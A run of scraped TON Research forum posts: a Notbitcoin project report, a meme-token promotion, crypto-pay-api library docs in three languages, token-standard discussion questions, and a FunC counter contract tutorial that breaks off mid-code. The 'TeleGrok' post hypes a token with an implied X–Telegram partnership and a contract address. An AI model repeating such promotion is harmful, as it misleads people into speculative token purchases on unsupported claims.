We have developed **$NBIT** as a practical payment method, not only within the Notbitcoin ecosystem but also through partner projects. A prime example is **ClickHub**, a Telegram Mini App for affiliate marketing, where users can post affiliate links and offer $NBIT rewards for each click. This integration positions $NBIT as a tool for decentralized e-commerce and digital marketing, creating value for the community. We encourage our community to propose new use cases for $NBIT, from digital service payments to everyday transactions, to expand the token’s utility and deliver benefits to users.

## [](#p-68654-h-4-transparency-and-building-with-the-community-5)4\. Transparency and Building with the Community

At Notbitcoin, we place the community at the heart of every decision. Despite challenges such as delays in rolling out new features or updates, we remain transparent with our users about our progress and plans. We actively invite the community to contribute ideas, feedback, and suggestions to shape Notbitcoin’s future. Our vision, as outlined in our whitepaper, is to build a sustainable decentralized payment ecosystem where everyone can participate, contribute, use, and benefit. This transparency and collaborative spirit form the foundation of every product we develop, from NBITPAY to future features.

## [](#p-68654-conclusion-6)Conclusion

In our first year, we at **Notbitcoin** have achieved remarkable results: attracting **over 200,000 miners**, processing **39,000 fee-free transactions** on **NBITPAY** with a speed of **0.01 seconds**, and integrating **$NBIT** into practical applications like ClickHub. With a focus on building products for the community, we welcome ideas and feedback to improve our ecosystem while maintaining transparency at every step. Supported by the Telegram Mini App and TON Blockchain, along with the vision outlined in our whitepaper, we will continue to grow alongside our community, striving for a future of efficient and accessible decentralized payments worldwide.

While we have made significant strides, we recognize that becoming a globally adopted decentralized payment network is a long and challenging journey. With limited financial resources due to our decision not to raise external funding, we still have many areas to improve and refine over time. We sincerely hope for the community’s continued support, understanding, and contributions as we work to overcome these limitations and build a stronger, more sustainable Notbitcoin ecosystem.

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 41576

[TON Research](/)

# [$Telegrok The new Leading Meme on Ton](/t/telegrok-the-new-leading-meme-on-ton/41576)

[General](/c/general/4) 

    

[Seal](https://tonresear.ch/u/Seal)  May 29, 2025, 8:05pm  1

TeleGrok is the new Meme on chain symbolizing the partnership between X (Elon) and Telegram (Pavel) it has unique mechanics like 3% tax on buys and sells wich is equally airdropped to holders. As Ton season starts the New Ceo is Intrested in Memes and showing commitment. He’s interacting with community and showing attention to requests.

Ca:

EQCuL6Wsat0pVnKKTUYrCUZ2-AqAvpQAMYeF-OC\_oCN6A5IX

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 416

[TON Research](/)

# [@foile/crypto-pay-api: Integrating Cryptocurrency Payments with TON Blockchain](/t/foile-crypto-pay-api-integrating-cryptocurrency-payments-with-ton-blockchain/416)

[Application](/c/application/20) 

    

[Vegeta](https://tonresear.ch/u/Vegeta)   February 19, 2024, 6:30pm  1

**[Crypto Pay](http://t.me/CryptoBot/?start=pay)** is a payment system based on [@CryptoBot](http://t.me/CryptoBot), leveraging the TON Blockchain (The Open Network) to facilitate cryptocurrency transactions through an API. This library assists in interfacing with **Crypto Pay** via the [Crypto Pay API](https://telegra.ph/Crypto-Pay-API-11-25).

## [](#installation-1)Installation

To integrate the library, use the following command:

```
npm i @foile/crypto-pay-api
```

## [](#usage-2)Usage

### [](#api-initialization-3)API Initialization

Firstly, create an application and obtain an API token by sending a `/pay` command to either [@CryptoBot](http://t.me/CryptoBot?start=pay) or [@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay) for testnet usage. Then, verify the API functionality by calling the `getMe()` method:

```
const { CryptoPay } = require('@foile/crypto-pay-api');
  
const cryptoPay = new CryptoPay(token);
const app = await cryptoPay.getMe();
console.log(app);
```

Optional parameters such as `hostname` and `protocol` can be set as follows:

```
const cryptoPay = new CryptoPay(token, {
  hostname: 'testnet-pay.crypt.bot',
  protocol: 'https'
});
```

Net

Bot

Hostname

mainnet

[@CryptoBot](http://t.me/CryptoBot?start=pay)

`pay.crypt.bot`

testnet

[@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay)

`testnet-pay.crypt.bot`

> Note: All queries to the Crypto Pay API must be sent over **HTTPS**.

### [](#creating-invoices-4)Creating Invoices

Invoices can be created with various options, including supported assets and custom button names:

```
const { CryptoPay, Assets, PaidButtonNames } = require('@foile/crypto-pay-api');

const cryptoPay = new CryptoPay(token);
cryptoPay.createInvoice(Assets.BTC, 1, {
  description: 'kitten',
  paid_btn_name: PaidButtonNames.VIEW_ITEM,
  paid_btn_url: 'http://placekitten.com/150',
});
```

Refer to the [examples directory](https://github.com/Foile/crypto-pay-api/tree/main/examples) for complete code samples.

### [](#webhooks-5)Webhooks

Webhooks provide real-time updates for the application. It is recommended to use a secret path in the URL for security, e.g., `https://www.example.com/<secret>`.

```
const cryptoPay = new CryptoPay(token, {
  webhook: {
    serverHostname: 'localhost',
    serverPort: 4200,
    path: '/secret-path'
  },
});

cryptoPay.on('invoice_paid', update => console.log(update.payload));
```

Simpler alias methods are also available for update handling:

```
cryptoPay.invoicePaid(update => console.log(update.payload));
```

## [](#api-methods-6)API Methods

The library provides various methods for interacting with the Crypto Pay API, including but not limited to:

*   `getMe()`: Retrieves basic app information.
*   `createInvoice(asset, amount, options)`: Creates a new invoice.
*   `transfer(user_id, asset, amount, spend_id, options)`: Sends coins from the app to the user.
*   `getInvoices(options)`: Retrieves invoices of the app.
*   `getBalance()`: Retrieves the app’s balance.
*   `getExchangeRates()`: Retrieves exchange rates of supported currencies.
*   `getCurrencies()`: Retrieves supported currencies.

### [](#update-types-7)Update Types

The library supports different update types, such as `invoice_paid`, to handle various events.

## [](#constants-8)Constants

The library provides constants for assets and paid button names for convenience:

Constant

Value

`Assets.BTC`

`BTC`

`Assets.TON`

`TON`

`Assets.ETH`

`ETH`

`Assets.USDT`

`USDT`

`Assets.USDC`

`USDC`

`Assets.BUSD`

`BUSD`

`PaidButtonNames.VIEW_ITEM`

`viewItem`

`PaidButtonNames.OPEN_CHANNEL`

`openChannel`

`PaidButtonNames.OPEN_BOT`

`openBot`

`PaidButtonNames.CALLBACK`

`callback`

* * *

This article provides a comprehensive overview of integrating

cryptocurrency payments using the TON Blockchain with the @foile/crypto-pay-api library.

![](https://github.githubassets.com/favicons/favicon.svg) [GitHub](https://github.com/Foile/crypto-pay-api)

![](https://tonresear.ch/uploads/default/optimized/1X/7cc74c2e6e1be058985b8e1667562c53fb6b369a_2_690x345.png)

### [GitHub - Foile/crypto-pay-api: Cryptocurrency payment system based on @CryptoBot](https://github.com/Foile/crypto-pay-api)

Cryptocurrency payment system based on @CryptoBot. Contribute to Foile/crypto-pay-api development by creating an account on GitHub.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 418

[TON Research](/)

# [@foile/crypto-pay-api：集成加密货币支付系统](/t/foile-crypto-pay-api/418)

[中文 (简繁)](/c/zh/application/55)  [应用](/c/zh/application/55) 

    

[QianXuesen](https://tonresear.ch/u/QianXuesen)  February 19, 2024, 6:41pm  1

**[Crypto Pay](http://t.me/CryptoBot/?start=pay)** 是基于 [@CryptoBot](http://t.me/CryptoBot) 的支付系统，允许您使用 API 接受加密货币支付。本库帮助您通过 [Crypto Pay API](https://telegra.ph/Crypto-Pay-API-11-25) 与 **Crypto Pay** 进行交互。

## [](#h-1)安装

使用以下命令集成库：

```
npm i @foile/crypto-pay-api
```

## [](#h-2)使用方法

### [](#api-3)API 初始化

首先，创建应用并获取 API 令牌，通过向 [@CryptoBot](http://t.me/CryptoBot?start=pay) 或 [@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay)（测试网）发送 `/pay` 命令。然后，通过调用 `getMe()` 方法验证 API 功能：

```
const { CryptoPay } = require('@foile/crypto-pay-api');
  
const cryptoPay = new CryptoPay(token);
const app = await cryptoPay.getMe();
console.log(app);
```

可以设置可选参数，如 `hostname` 和 `protocol`：

```
const cryptoPay = new CryptoPay(token, {
  hostname: 'testnet-pay.crypt.bot',
  protocol: 'https'
});
```

网络

机器人

主机名

主网

[@CryptoBot](http://t.me/CryptoBot?start=pay)

`pay.crypt.bot`

测试网

[@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay)

`testnet-pay.crypt.bot`

> 注意：所有对 Crypto Pay API 的查询必须通过 **HTTPS** 发送。

### [](#h-4)创建发票

可以使用各种选项创建发票，包括支持的资产和自定义按钮名称：

```
const { CryptoPay, Assets, PaidButtonNames } = require('@foile/crypto-pay-api');

const cryptoPay = new CryptoPay(token);
cryptoPay.createInvoice(Assets.BTC, 1, {
  description: '小猫',
  paid_btn_name: PaidButtonNames.VIEW_ITEM,
  paid_btn_url: 'http://placekitten.com/150',
});
```

完整的代码示例请参考 [示例目录](https://github.com/Foile/crypto-pay-api/tree/main/examples)。

### [](#webhooks-5)Webhooks

Webhooks 提供应用的实时更新。出于安全考虑，建议在 URL 中使用秘密路径，例如 `https://www.example.com/<secret>`。

```
const cryptoPay = new CryptoPay(token, {
  webhook: {
    serverHostname: 'localhost',
    serverPort: 4200,
    path: '/secret-path'
  },
});

cryptoPay.on('invoice_paid', update => console.log(update.payload));
```

还可以使用简化的别名方法处理更新：

```
cryptoPay.invoicePaid(update => console.log(update.payload));
```

## [](#api-6)API 方法

该库提供了与 Crypto Pay API 交互的各种方法，包括但不限于：

*   `getMe()`：检索应用的基本信息。
*   `createInvoice(asset, amount, options)`：创建新的发票。
*   `transfer(user_id, asset, amount, spend_id, options)`：从应用向用户发送货币。
*   `getInvoices(options)`：检索应用的发票。
*   `getBalance()`：检索应用的余额。
*   `getExchangeRates()`：检索支持货币的汇率。
*   `getCurrencies()`：检索支持的货币。

### [](#h-7)更新类型

该库支持不同的更新类型，例如 `invoice_paid`，以处理各种事件。

## [](#h-8)常量

该库为方便起见提供了资产和支付按钮名称的常量：

常量

值

`Assets.BTC`

`BTC`

`Assets.TON`

`TON`

`Assets.ETH` | `ETH` |  
| `Assets.USDT` | `USDT` |  
| `Assets.USDC` | `USDC` |  
| `Assets.BUSD` | `BUSD` |  
| `PaidButtonNames.VIEW_ITEM` | `viewItem` |  
| `PaidButtonNames.OPEN_CHANNEL` | `openChannel` |  
| `PaidButtonNames.OPEN_BOT` | `openBot` |  
| `PaidButtonNames.CALLBACK` | `callback` |

\[—

以上是针对 TON 区块链的技术文章，采用第三人称描述，并以专业、学术的风格撰写的中文文章。\]([GitHub - Foile/crypto-pay-api: Cryptocurrency payment system based on @CryptoBot](https://github.com/Foile/crypto-pay-api))

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 42

[TON Research](/)

# [Exploring Token Standards and Use Cases on The Open Network: Jettons, Collectibles, and Beyond](/t/exploring-token-standards-and-use-cases-on-the-open-network-jettons-collectibles-and-beyond/42)

[Application](/c/application/jetton/26)  [Jetton](/c/application/jetton/26) 

    

[kingsman](https://tonresear.ch/u/kingsman)  January 23, 2024, 1:54pm  1

The Open Network (TON) has broadened the scope of blockchain technology by introducing a diverse range of tokens, both fungible and non-fungible, and offering unique applications within its ecosystem. This expansion not only enhances digital ownership but also aligns with TON’s vision of integrating real-world Web3 use cases. In this context, we aim to delve into the details of the token standards on TON, their functionalities, and implications for the broader blockchain landscape.

1.  What are the key characteristics of the TON Jetton token standard introduced in March 2022, and how does it enable the creation of unique cryptocurrencies (Jettons) on TON Blockchain? Compare this with token standards on other blockchains like Ethereum.
2.  Discuss the various use cases of Jettons on TON, focusing on their roles in ecosystem development, user incentivization, and representation of rights. How do these use cases compare to those of traditional cryptocurrencies and tokens on other blockchain platforms?
3.  Explain the process of purchasing and storing Jettons on TON. What are the advantages of TON’s user-friendly interfaces and storage solutions, like Tonkeeper and TON Space, compared to other platforms such as MetaMask?
4.  Describe the concept of Collectibles in the TON Ecosystem. How do these non-fungible digital assets differ from Jettons, and what unique functionalities do they offer, such as trading utility, exclusive access, and gaming integration?
5.  TON supports advanced NFT standards like the Soulbound Token (SBT) and the Compressed NFT (cNFT). How do these standards differ from traditional NFTs, and what are their specific applications within the TON ecosystem, particularly in contexts like social permissions, certifications, and gaming competitions?
6.  Explore the landscape of NFT marketplaces and services within the TON Ecosystem. How do platforms like TON Diamonds or GetGems facilitate the purchase and storage of Collectibles, and what does this mean for the accessibility and popularity of NFTs on TON?
7.  Lastly, considering the diverse range of tokens and their applications on TON, how does this impact the overall potential and utility of the TON Ecosystem? Discuss the implications for users, developers, and the future of digital asset ownership and blockchain technology.

This inquiry aims to provide a comprehensive understanding of the token standards on TON, their diverse use cases, and their significance in the broader context of blockchain innovation and digital ownership. Insights from experts in blockchain technology, digital asset economics, and decentralized finance are particularly valuable for this discussion.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 421

[TON Research](/)

# [@foile/crypto-pay-api: Интеграция платежной системы криптовалюты с TON Blockchain](/t/foile-crypto-pay-api-ton-blockchain/421)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

    

[AlekseyBlokcheynov](https://tonresear.ch/u/AlekseyBlokcheynov)   February 19, 2024, 6:55pm  1

**[Crypto Pay](http://t.me/CryptoBot/?start=pay)** - это платежная система, основанная на [@CryptoBot](http://t.me/CryptoBot), которая позволяет принимать платежи в криптовалюте с использованием API. Эта библиотека помогает работать с **Crypto Pay** через [Crypto Pay API](https://telegra.ph/Crypto-Pay-API-11-25).

## [](#h-1)Установка

Для интеграции библиотеки используйте следующую команду:

```
npm i @foile/crypto-pay-api
```

## [](#h-2)Использование

### [](#api-3)API

Сначала создайте приложение и получите токен API, отправив команду `/pay` в [@CryptoBot](http://t.me/CryptoBot?start=pay) или [@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay) (для тестовой сети). Затем проверьте функциональность API, вызвав метод `getMe()`:

```
const { CryptoPay } = require('@foile/crypto-pay-api');
  
const cryptoPay = new CryptoPay(token);
const app = await cryptoPay.getMe();
console.log(app);
```

Можно установить необязательные параметры, такие как `hostname` и `protocol`:

```
const cryptoPay = new CryptoPay(token, {
  hostname: 'testnet-pay.crypt.bot',
  protocol: 'https'
});
```

Сеть

Бот

Хост

mainnet

[@CryptoBot](http://t.me/CryptoBot?start=pay)

`pay.crypt.bot`

testnet

[@CryptoTestnetBot](http://t.me/CryptoTestnetBot?start=pay)

`testnet-pay.crypt.bot`

> Примечание: Все запросы к API Crypto Pay должны отправляться через **HTTPS**.

### [](#h-4)Создание счетов

Счета можно создавать с различными параметрами, включая поддерживаемые активы и настраиваемые имена кнопок:

```
const { CryptoPay, Assets, PaidButtonNames } = require('@foile/crypto-pay-api');

const cryptoPay = new CryptoPay(token);
cryptoPay.createInvoice(Assets.BTC, 1, {
  description: 'котенок',
  paid_btn_name: PaidButtonNames.VIEW_ITEM,
  paid_btn_url: 'http://placekitten.com/150',
});
```

Полные примеры кода смотрите в [директории примеров](https://github.com/Foile/crypto-pay-api/tree/main/examples).

### [](#webhooks-5)Webhooks

Webhooks обеспечивают получение обновлений для приложения в реальном времени. Рекомендуется использовать секретный путь в URL для безопасности, например, `https://www.example.com/<secret>`.

```
const cryptoPay = new CryptoPay(token, {
  webhook: {
    serverHostname: 'localhost',
    serverPort: 4200,
    path: '/secret-path'
  },
});

cryptoPay.on('invoice_paid', update => console.log(update.payload));
```

## [](#api-6)Методы API

Библиотека предоставляет различные методы для взаимодействия с API Crypto Pay, включая, но не ограничиваясь:

*   `getMe()`: Получает основную информацию о приложении.
*   `createInvoice(asset, amount, options)`: Создает новый счет.
*   `transfer(user_id, asset, amount, spend_id, options)`: Отправляет монеты от приложения пользователю.
*   `getInvoices(options)`: Получает счета приложения.
*   `getBalance()`: Получает баланс приложения.
*   \`getExchangeRates

()\`: Получает обменные курсы поддерживаемых валют.

*   `getCurrencies()`: Получает поддерживаемые валюты.

### [](#h-7)Типы обновлений

Библиотека поддерживает различные типы обновлений, такие как `invoice_paid`, для обработки различных событий.

## [](#h-8)Константы

Библиотека предоставляет константы для активов и имен оплаченных кнопок для удобства:

Константа

Значение

`Assets.BTC`

`BTC`

`Assets.TON`

`TON`

`Assets.ETH`

`ETH`

`Assets.USDT`

`USDT`

`Assets.USDC`

`USDC`

`Assets.BUSD`

`BUSD`

`PaidButtonNames.VIEW_ITEM`

`viewItem`

`PaidButtonNames.OPEN_CHANNEL`

`openChannel`

`PaidButtonNames.OPEN_BOT`

`openBot`

`PaidButtonNames.CALLBACK`

`callback`

* * *

Эта статья предоставляет комплексный обзор интеграции платежей криптовалюты с использованием TON Blockchain с помощью библиотеки @foile/crypto-pay-api.

![](https://github.githubassets.com/favicons/favicon.svg) [GitHub](https://github.com/Foile/crypto-pay-api)

![](https://tonresear.ch/uploads/default/optimized/1X/da781717ef147768b987bd07b4933efdfef203df_2_690x345.png)

### [GitHub - Foile/crypto-pay-api: Cryptocurrency payment system based on @CryptoBot](https://github.com/Foile/crypto-pay-api)

Cryptocurrency payment system based on @CryptoBot. Contribute to Foile/crypto-pay-api development by creating an account on GitHub.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 427

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 1 Simple Smart Contract](/t/create-smart-contracts-on-ton-lesson-1-simple-smart-contract/427)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:20pm  1

## [](#introduction-1)Introduction

In this lesson, we will write your first smart contract on the TON blockchain using the FunC language, deploy it to the test network using [Blueprint](https://github.com/ton-community/blueprint), and try to interact with it using the [ton](https://github.com/ton-org/ton) JavaScript library.

> \*Deploy - the process of transferring to the network (in this case, a smart contract to the blockchain)

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

## [](#smart-contract-3)Smart Contract

The smart contract we will create should have the following functionality:

*   Store an integer _total_ in its data - a 64-bit unsigned integer
*   When receiving an internal incoming message, the contract should take a 32-bit unsigned integer from the message body, add it to _total_, and save it in its data
*   The smart contract should have a method _get\_total_ that allows you to retrieve the value of _total_
*   If the body of the incoming message is less than 32 bits, the contract should throw an exception

## [](#create-a-project-using-blueprint-4)Create a project using Blueprint

In the console, run the following command:

```
npm create ton@latest
```

Then simply follow the instructions. You will need to enter the project name, the name of the smart contract, and optionally choose a template for a simple contract. For our lesson, let’s name the project `my-counter`, the smart contract `Counter`, and choose to start with an empty contract in the **FunC** language, which we will discuss a little later.

```
? Project name my-counter
? First created contract name (PascalCase) Counter
? Choose the project template An empty contract (FunC)
```

Blueprint will create a simple project. Go to its directory:

```
cd my-counter
```

There you will see 4 folders:

*   contracts
*   wrappers
*   scripts
*   tests

At this stage, we are interested in the _contracts_ and _wrappers_ folders, where we will write code in FunC and its TypeScript wrapper, respectively.

##### [](#what-is-func-5)What is FunC?

For programming smart contracts on the TON blockchain, it is recommended to use the FunC language. You can learn more about it [in the documentation](https://docs.ton.org/develop/func/overview).

##### [](#prepare-a-file-for-our-code-6)Prepare a file for our code

Go to the contracts folder:

```
cd contracts
```

And open the `counter.fc` file. On your screen, you will see a smart contract with just one empty function. Now we are ready to start writing our first smart contract.

## [](#smart-contract-functions-7)Smart Contract Functions

Smart contracts on the TON network have two main functions:

*   The first one, `recv_external()`, is executed when a request to the contract comes from the external world, i.e., not from TON. For example, when you use an application to access a wallet smart contract to transfer Toncoin to a friend, this request is made through `recv_external()`.
*   The second one, `recv_internal()`, is executed when a contract is accessed directly within the blockchain. For example, when another contract accesses ours.

In our case, `recv_internal()` is suitable.

The `counter.fc` file already has a declared function without code:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    ;; code will be here
}
```

> ;; two semicolons denote a single-line comment

The function takes numbers with the contract balance, the value of the incoming message, a cell with the original message, and a slice in\_msg\_body that contains only the body of the received message. We also use the impure keyword.

`impure` is a keyword that tells the compiler that its execution cannot be removed during optimizations.

For example, we need to specify impure if a function can modify contract storage, send messages, or generate exceptions.

Important: If impure is not specified and the result of the function call is not used, the FunC compiler is free to remove this function call.

To understand what a slice and a cell are, let’s talk about data types in TON.

##### [](#types-cell-slice-builder-integer-in-func-8)Types cell, slice, builder, integer in FunC

In our simple smart contract, we will use only four types:

*   Cell - A TVM cell consisting of 1023 bits of data and up to 4 references to other cells. The presence of references forms a so-called “cell tree.”
*   Slice - A partial representation of a TVM cell used to read data from a cell.
*   Builder - A partially constructed cell containing up to 1023 bits of data and up to four references. We can only write new data to this type of cell and then convert it to a regular Cell.
*   Integer - a signed 257-bit integer.

You can read more about FunC types in the [documentation](https://docs.ton.org/develop/func/types).

In simple terms, a cell is a sealed cell, a slice is a cell from which data can be read, and a builder is a cell to which data can be written.

## [](#reading-an-integer-from-the-message-body-9)Reading an Integer from the Message Body

To read an Integer from the received slice with the message body, add the following code:  
`int n = in_msg_body~load_uint(32);`

The `recv_internal()` function now looks like this:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);
}
```

`load_uint` is a function from the [standard FunC library](https://docs.ton.org/develop/func/stdlib/). It reads and returns an unsigned integer of a specified size from the slice.

## [](#smart-contract-data-10)Smart Contract Data

To add the received variable to `total` and save the value in the smart contract, let’s consider how the functionality of storing persistent data/storage is implemented in TON.

> Note: Do not confuse this with TON Storage; storage in the previous sentence is a convenient analogy.

The TVM virtual machine is stack-based, but in addition to the stack, it has special “registers” that store, for example, the code of a smart contract, the global blockchain configuration, and the data of a smart contract.

To store persistent data, register `c4` is allocated with the Cell type.

You can learn more about registers in the [documentation](https://docs.ton.org/learn/tvm-instructions/tvm-overview#control-registers).

##### [](#retrieve-data-from-c4-11)Retrieve Data from c4

To “retrieve” data from c4, we need two functions from the [standard FunC library](https://docs.ton.org/develop/func/stdlib/).

Namely:  
`get_data` - retrieves a cell from register c4.  
`begin_parse` - converts a cell into a slice.

Let’s create a variable `ds` and put the received slice into it.

`slice ds = get_data().begin_parse();`

Also, let’s read the 64-bit number from this slice into the numeric variable `total` for summation according to our task. (Using the already familiar `load_uint` function)

`int total = ds~load_uint(64);`

Now our function looks like this:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);
}
```

##### [](#summing-12)Summing

To perform the summation, we will use the addition operation `+` and the assignment `=`.

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;
}
```

> Like in many other programming languages, in FunC, you can combine the `+` and `=` operations into `+=`. The same goes for `-=`, `/=`, `*=`.

##### [](#saving-the-value-13)Saving the Value

To save the value of `total` in the persistent data of the contract, we need to perform four actions:

*   Create a Builder for the future data cell
*   Write the value to this builder
*   Convert the builder to a cell
*   Write the resulting cell to register c4

We will do this again using functions from the [standard FunC library](https://docs.ton.org/develop/func/stdlib/).

`set_data(begin_cell().store_uint(total, 64).end_cell());`

`begin_cell()` - creates a Builder for the future cell  
`store_uint()` - writes the value of total  
`end_cell()` - creates a Cell from the builder  
`set_data()` - writes the cell to register c4

Result:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}
```

## [](#generating-exceptions-14)Generating Exceptions

All that remains to be done in our `recv_internal()` function is to add a call to an exception if the body of the received message does not have enough bits for a 32-bit number.

To do this, we will use the built-in exceptions from the [FunC built-ins](https://docs.ton.org/develop/func/builtins).

Exceptions can be triggered by conditional primitives `throw_if` and `throw_unless`, as well as by unconditional `throw`.

Let’s use `throw_if` and pass any error code. To determine the bit length, we will use `slice_bits()`.

```
throw_if(35, in_msg_body.slice_bits() < 32);
```

By the way, in TVM (TON Virtual Machine), there are standard exception codes, which we will need in the tests. You can see them [here](https://docs.ton.org/learn/tvm-instructions/tvm-exit-codes).

Insert at the beginning of the function:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    throw_if(35, in_msg_body.slice_bits() < 32);

    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}
```

## [](#writing-the-get-function-15)Writing the Get Function

Any function in FunC follows the following pattern:

`[<forall declarator>] <return_type><function_name(<comma_separated_function_args>) <specifiers>`

Let’s write a function `get_total()` that returns an Integer and has the method\_id specifier (we’ll talk about this a little later).

```
int get_total() method_id {
    ;; code will be here
}
```

##### [](#method_id-16)method\_id

The `method_id` specifier allows you to call a function by its name. It is mandatory for get methods.

##### [](#retrieve-data-from-c4-17)Retrieve Data from c4

To make the function return `total` stored in the contract, we need to retrieve the data from the register, which we have already done:

```
int get_total() method_id {
    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    return total;
}
```

## [](#the-entire-code-of-our-smart-contract-18)The Entire Code of Our Smart Contract

```
#include "imports/stdlib.fc";

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    throw_if(35, in_msg_body.slice_bits() < 32);

    int n = in_msg_body~load_uint(32);

    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    total += n;

    set_data(begin_cell().store_uint(total, 64).end_cell());
}

int get_total() method_id {
    slice ds = get_data().begin_parse();
    int total = ds~load_uint(64);

    return total;
}
```

## [](#writing-a-wrapper-for-the-contract-in-typescript-19)Writing a Wrapper for the Contract in TypeScript

We want to be able to interact with our smart contract. To do this, we will write a so-called wrapper in TypeScript (a typed JavaScript).

Go to the wrappers directory of the project and open the Counter.ts file. Most of the wrapper is already present by default. Now we just need to add the part where the contract data for deployment is set and add two functions for interaction: sending numbers to the contract and calling the get\_total method.

### [](#set-deployment-data-20)Set Deployment Data

These lines are responsible for what we want to set in the contract data (cell c4):

```
export type CounterConfig = {};

export function counterConfigToCell(config: CounterConfig): Cell {
    return beginCell().endCell();
}
```

`CounterConfig` is an object to which we can add values that will be used to initialize the contract.  
`counterConfigToCell` is a function that converts the object itself into a cell ready to be written to the contract data for deployment.

In our case, the contract data should contain only one 64-bit number. We don’t need the CounterConfig, but we do need to update the function.

The function returns only one cell, into which we write the data for deploying the contract. Let’s add a record of a 64-bit number to it:

```
return beginCell().storeUint(0, 64).endCell();
```

Now, when creating a contract, it will already have the number 0 in its data.

### [](#method-for-sending-messages-with-numbers-21)Method for Sending Messages with Numbers

Below, in the same file, the Counter class is initialized, in which we can modify existing methods or add new ones to interact with the contract. By default, it already has methods for initializing the contract from either a config or the address of an already deployed contract, as well as a ready-made method for deployment.

Let’s add a method that allows us to send a message to the contract to increase the total number.

> All wrapper methods that send messages must have the `send` prefix at the beginning.  
> All wrapper methods that call get methods must have the `get` prefix at the beginning.

For convenience, we can copy the sendDeploy method, rename it to sendNumber, and then only change what is needed.

```
async sendNumber(provider: ContractProvider, via: Sender, value: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().endCell(),
    });
}
```

This method takes provider and via objects, which determine where and from whom the message should be sent, respectively. It also takes a value number, which means how many Toncoins we want to attach to the sent message.

The provider.internal() function is called in the method body, which sends a message to our contract. It takes the via object we obtained earlier, as well as the parameters of the sent message. These parameters are what we need to change now.

As we remember, our smart contract expects only one 32-bit number from the received message. Let’s add an argument to our method and change the body parameter:

```
async sendNumber(provider: ContractProvider, via: Sender, value: bigint, number: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(number, 32).endCell(),
    });
}
```

It is better to always use the bigint type for numbers in smart contract wrappers, as it supports very large numbers and is more accurate than number.

### [](#method-for-calling-get_total-22)Method for Calling get\_total

Let’s add a method that will call get\_total on our contract:

```
async getTotal(provider: ContractProvider) {
    // code will be here
}
```

It should no longer take the via and value parameters, as no messages are sent when calling get methods.

Let’s add a call to get\_total in our method. To do this, we will use the `provider.get` function, which takes two parameters: the name of the get method and the arguments to pass to it. In our case, the name is “get\_total”, and the argument list is empty.

```
const result = (await provider.get('get_total', [])).stack;
```

Now let’s return the received number from our getTotal function:

```
return result.readBigNumber();
```

### [](#the-entire-wrapper-code-23)The Entire Wrapper Code

```
import {
    Address,
    beginCell,
    Cell,
    Contract,
    contractAddress,
    ContractProvider,
    Sender,
    SendMode,
} from 'ton-core';

export type CounterConfig = {};

export function counterConfigToCell(config: CounterConfig): Cell {
    return beginCell().storeUint(0, 64).endCell();
}

export class Counter implements Contract {
    constructor(
        readonly address: Address,
        readonly init?: { code: Cell; data: Cell }
    ) {}

    static createFromAddress(address: Address) {
        return new Counter(address);
    }

    static createFromConfig(config: CounterConfig, code: Cell, workchain = 0) {
        const data = counterConfigToCell(config);
        const init = { code, data };
        return new Counter(contractAddress(workchain, init), init);
    }

    async sendDeploy(provider: ContractProvider, via: Sender, value: bigint) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().endCell(),
        });
    }

    async sendNumber(
        provider: ContractProvider,
        via: Sender,
        value: bigint,
        number: bigint
    ) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().storeUint(number, 32).endCell(),
        });
    }

    async getTotal(provider: ContractProvider) {
        const result = (await provider.get('get_total', [])).stack;
